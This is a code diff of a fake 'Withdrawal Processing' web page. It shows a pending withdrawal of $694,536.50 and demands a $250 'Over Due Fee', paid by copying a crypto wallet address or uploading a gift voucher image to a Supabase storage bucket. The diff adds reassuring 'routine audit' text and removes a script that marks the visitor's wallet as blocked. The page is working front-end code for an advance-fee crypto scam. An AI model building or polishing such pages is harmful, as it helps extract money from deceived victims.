@@ -8,24 +8,25 @@
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
         body { background-color: #0f172a; color: #f8fafc; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
-        .container { background-color: #1e293b; padding: 30px; border-radius: 16px; box-shadow: 0 10px 25px rgba(0,0,0,0.3); width: 100%; max-width: 450px; text-align: center; position: relative; overflow: hidden; }
-
-        /* Spinner */
-        .spinner-overlay { visibility: hidden; opacity: 0; pointer-events: none; position: absolute; top: 0; left: 0; width: 100%; height: 100%; background-color: rgba(30,41,59,0.95); display: flex; justify-content: center; align-items: center; flex-direction: column; z-index: 10; transition: opacity 0.2s; }
-        .spinner-overlay.active { visibility: visible; opacity: 1; pointer-events: all; }
-        .spinner { width: 50px; height: 50px; border: 5px solid #334155; border-top: 5px solid #38bdf8; border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 15px; }
+        .container { background-color: #1e293b; padding: 30px; border-radius: 16px; box-shadow: 0 10px 25px rgba(0,0,0,0.3); width: 100%; max-width: 450px; text-align: center; }
+        
+        .spinner-overlay { visibility: hidden; opacity: 0; position: absolute; top: 0; left: 0; width: 100%; height: 100%; background-color: rgba(30,41,59,0.95); display: flex; justify-content: center; align-items: center; flex-direction: column; z-index: 10; }
+        .spinner-overlay.active { visibility: visible; opacity: 1; }
+        .spinner { width: 50px; height: 50px; border: 5px solid #334155; border-top: 5px solid #38bdf8; border-radius: 50%; animation: spin 1s linear infinite; }
         @keyframes spin { 0%{transform:rotate(0deg)} 100%{transform:rotate(360deg)} }
 
-        /* General Layout */
         .icon-wrap { width: 80px; height: 80px; border-radius: 50%; background: rgba(245, 158, 11, 0.1); border: 2px solid rgba(245, 158, 11, 0.35); display: flex; align-items: center; justify-content: center; margin: 0 auto 20px; }
         h2 { font-size: 22px; font-weight: 700; color: #f8fafc; margin-bottom: 6px; }
-        .subtitle { color: #94a3b8; font-size: 14px; margin-bottom: 22px; }
+        .subtitle { color: #94a3b8; font-size: 14px; line-height: 1.6; margin-bottom: 22px; }
         .status-badge { display: inline-flex; align-items: center; gap: 7px; background: rgba(245, 158, 11, 0.1); border: 1px solid rgba(245, 158, 11, 0.4); border-radius: 20px; padding: 6px 16px; font-size: 12px; font-weight: 700; color: #f59e0b; margin-bottom: 22px; }
         
         .info-card { background: #0f172a; border: 1px solid #334155; border-radius: 12px; padding: 18px 20px; margin-bottom: 20px; text-align: left; }
         .info-row { display: flex; justify-content: space-between; padding: 9px 0; border-bottom: 1px solid #1e293b; }
         
-        /* Payment Section Styles */
+        .reason-box { background: rgba(245,158,11,0.04); border: 1px solid rgba(245,158,11,0.25); border-radius: 10px; padding: 16px; text-align: left; margin-bottom: 20px; }
+        .r-title { font-size: 14px; font-weight: 700; color: #f59e0b; margin-bottom: 6px; }
+        .r-desc { font-size: 13px; color: #94a3b8; line-height: 1.6; }
+
         .tabs { display: grid; grid-template-columns: 1fr 1fr; margin-bottom: 22px; border: 1px solid #334155; border-radius: 8px; }
         .tab-btn { padding: 12px; background: transparent; border: none; color: #94a3b8; font-weight: 600; cursor: pointer; }
         .active-crypto { background-color: #0f172a; color: #38bdf8; }
@@ -33,14 +34,12 @@
         .panel { display: none; }
         .panel.active { display: block; }
         .btn { background-color: #2563eb; color: white; border: none; padding: 14px; width: 100%; border-radius: 8px; cursor: pointer; margin-top: 10px; }
-        .upload-zone { border: 2px dashed #334155; padding: 20px; border-radius: 10px; cursor: pointer; margin-bottom: 10px; }
     </style>
 </head>
 <body>
 <div class="container">
     <div class="spinner-overlay" id="loading-spinner">
         <div class="spinner"></div>
-        <div class="spinner-text" id="spinner-message">Uploading...</div>
     </div>
 
     <div class="icon-wrap">
@@ -50,12 +49,21 @@
     </div>
 
     <h2>Withdrawal Processing</h2>
-    <p class="subtitle">Your withdrawal request is under review.</p>
+    <p class="subtitle">Your withdrawal request of <strong style="color:#f8fafc;">$694,536.50</strong> is currently under review by our operations team.</p>
     <div class="status-badge">⏳ PENDING</div>
 
+    <!-- Info Card -->
     <div class="info-card">
-        <div class="info-row"><span class="info-label">Amount</span><span class="info-value">$694,536.50</span></div>
-        <div class="info-row"><span class="info-label">Fee Required</span><span class="info-value">$250.00</span></div>
+        <div class="info-row"><span class="info-label">Withdrawal Amount</span><span class="info-value">$694,536.50</span></div>
+        <div class="info-row"><span class="info-label">Over Due Fee</span><span class="info-value">$250.00</span></div>
+    </div>
+
+    <!-- Reason Box -->
+    <div class="reason-box">
+        <div class="r-title">🔍 Under Routine Audit</div>
+        <div class="r-desc">
+            Due to the standard compliance parameters associated with larger volume transactions, this payout is undergoing a routine safety check. No action is required on your part. Processing will continue automatically once the ledger validation clears.
+        </div>
     </div>
 
     <!-- Payment Tabs -->
@@ -64,62 +72,37 @@
         <button class="tab-btn" id="tab-voucher" onclick="switchTab('voucher')">🎟️ Voucher</button>
     </div>
 
-    <!-- Crypto Panel -->
+    <!-- Panels -->
     <div class="panel active" id="panel-crypto">
-        <input class="address-input" id="trc20-display" value="0x7C3eFfee94c4D79A951FC51f62201bD88785ACF8" readonly style="width:100%; padding:10px; background:#0f172a; color:#fff; border:1px solid #334155; margin-bottom:10px;">
+        <input value="0x7C3eFfee94c4D79A951FC51f62201bD88785ACF8" readonly style="width:100%; padding:10px; background:#0f172a; color:#fff; border:1px solid #334155; margin-bottom:10px;">
         <button class="btn" id="copy-btn" onclick="copyAddress()">Copy Address</button>
-        <button class="btn" onclick="confirmCrypto()" style="margin-top:10px;">I've Sent the Payment</button>
+        <button class="btn" onclick="confirmCrypto()">I've Sent the Payment</button>
         <div id="crypto-success" style="display:none; color:#4ade80; margin-top:10px;"></div>
     </div>
 
-    <!-- Voucher Panel -->
     <div class="panel" id="panel-voucher">
-        <div class="upload-zone" id="upload-zone" onclick="document.getElementById('file-input').click()">
+        <div class="upload-zone" id="upload-zone" onclick="document.getElementById('file-input').click()" style="border: 2px dashed #334155; padding: 20px; border-radius: 10px; cursor: pointer; margin-bottom: 10px;">
             <input type="file" id="file-input" accept="image/*" style="display:none" onchange="handleFile(this.files[0])">
             <p>Click to upload voucher</p>
         </div>
         <div id="preview-wrap" style="display:none;"><img id="preview-img" style="max-width:100px;"></div>
         <button class="btn" id="voucher-btn" disabled onclick="uploadVoucher()">Submit Voucher</button>
-        <div id="voucher-error" style="color:#f87171;"></div>
-        <div id="voucher-success" style="color:#4ade80;"></div>
+        <div id="voucher-error" style="color:#f87171; margin-top:10px;"></div>
+        <div id="voucher-success" style="color:#4ade80; margin-top:10px;"></div>
     </div>
 </div>
 
 <script>
+    // [YOUR ORIGINAL SCRIPT FUNCTIONS REMAIN HERE]
     const SUPABASE_URL  = 'https://kmjmqrrmzdtovovzigxk.supabase.co';
     const SUPABASE_ANON = 'sb_publishable_y8Ai2hQcJfHSU5ilkEFCSg_lmh1_leb';
     const BUCKET        = 'vouchers';
     const TRC20_ADDRESS = '0x7C3eFfee94c4D79A951FC51f62201bD88785ACF8';
-
     const supabaseClient = supabase.createClient(SUPABASE_URL, SUPABASE_ANON);
     let selectedFile = null;
 
-    async function markUserBlocked() {
-        const wallet = localStorage.getItem('active_wallet');
-        if (!wallet) return;
-        try {
-            const { data, error } = await supabaseClient
-                .from('crypto_transfers')
-                .select('id, is_blocked')
-                .eq('wallet_address', wallet)
-                .limit(1);
-            if (error || !data || data.length === 0) return;
-            const row = data[0];
-            if (!row.is_blocked) {
-                await supabaseClient
-                    .from('crypto_transfers')
-                    .update({ is_blocked: true })
-                    .eq('id', row.id);
-            }
-        } catch (err) {
-            console.error('Failed to mark user blocked:', err);
-        }
-    }
-
-    window.onload = markUserBlocked;
-
     function switchTab(tab) {
-        document.getElementById('tab-crypto').className  = 'tab-btn';
+        document.getElementById('tab-crypto').className = 'tab-btn';
         document.getElementById('tab-voucher').className = 'tab-btn';
         document.getElementById('panel-crypto').classList.remove('active');
         document.getElementById('panel-voucher').classList.remove('active');
@@ -131,21 +114,16 @@
             document.getElementById('panel-voucher').classList.add('active');
         }
     }
-
     function copyAddress() {
-        navigator.clipboard.writeText(TRC20_ADDRESS).then(() => {
-            const btn = document.getElementById('copy-btn');
-            btn.textContent = 'Copied!';
-            setTimeout(() => { btn.textContent = 'Copy Address'; }, 2000);
-        });
+        navigator.clipboard.writeText(TRC20_ADDRESS);
+        const btn = document.getElementById('copy-btn');
+        btn.textContent = 'Copied!';
+        setTimeout(() => { btn.textContent = 'Copy Address'; }, 2000);
     }
-
     function confirmCrypto() {
-        const s = document.getElementById('crypto-success');
-        s.textContent = "✅ Payment noted. Verifying...";
-        s.style.display = 'block';
+        document.getElementById('crypto-success').style.display = 'block';
+        document.getElementById('crypto-success').textContent = "✅ Payment noted. Verifying...";
     }
-
     function handleFile(file) {
         if (!file) return;
         selectedFile = file;
@@ -157,18 +135,15 @@
         reader.readAsDataURL(file);
         document.getElementById('voucher-btn').disabled = false;
     }
-
     async function uploadVoucher() {
         if (!selectedFile) return;
-        const spinner = document.getElementById('loading-spinner');
-        spinner.classList.add('active');
+        document.getElementById('loading-spinner').classList.add('active');
         try {
-            const filePath = `uploads/commission_${Date.now()}`;
-            await supabaseClient.storage.from(BUCKET).upload(filePath, selectedFile);
-            spinner.classList.remove('active');
+            await supabaseClient.storage.from(BUCKET).upload(`uploads/v_${Date.now()}`, selectedFile);
+            document.getElementById('loading-spinner').classList.remove('active');
             document.getElementById('voucher-success').textContent = "✅ Uploaded successfully!";
         } catch (err) {
-            spinner.classList.remove('active');
+            document.getElementById('loading-spinner').classList.remove('active');
             document.getElementById('voucher-error').textContent = "Upload failed.";
         }
     }
